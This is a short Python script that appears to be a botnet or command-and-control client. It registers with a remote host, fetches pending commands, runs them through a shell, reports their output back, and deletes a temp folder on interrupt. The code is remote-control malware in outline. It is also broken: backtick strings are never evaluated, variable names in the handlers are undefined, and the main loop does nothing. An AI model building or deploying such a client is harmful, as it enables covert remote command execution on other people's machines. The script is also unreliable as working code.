#!`which python3`


import subprocess
import requests
import signal
import time
import json
import sys
import os

session=requests.session()


def self_destruct(signum, frame):
    os.system('rm -rf /tmp/lolz')
    exit(0)

signal.signal(signal.SIGINT, self_destruct)

CLIENTNAME="`hostname`"
UNAME="`uname -a`"
HOST=sys.argv[1]
CLIENTID, KEY=json.loads(session.post('http://' + HOST + '/client/register',data={
    'clientname':CLIENTNAME,
    'uname':UNAME,
}).text)


def do_cmd(cmd):
    return subprocess.check_output(cmd,shell=True).decode().strip()


def get_pending():
    return json.loads(session.post('http://'+HOST+'/client/get_pending', data={
        'clientname':CLIENTNAME,
        'uname':UNAME,
        'clientid':CLIENTID,
        'key':KEY,
    }).text)


def handle_pending(cnc):
    return json.dumps({
        'clientid': CLIENTID,
        'report': {
            commandid: do_cmd(command)
            for commandid, command in control
        }
    })


def report(data):
    session.post(
        'http://'+HOST+'/client/submit_pending',
        data=json.dumps(response),
        headers={'content-type':'application/json'}
    )


while True:
    pass

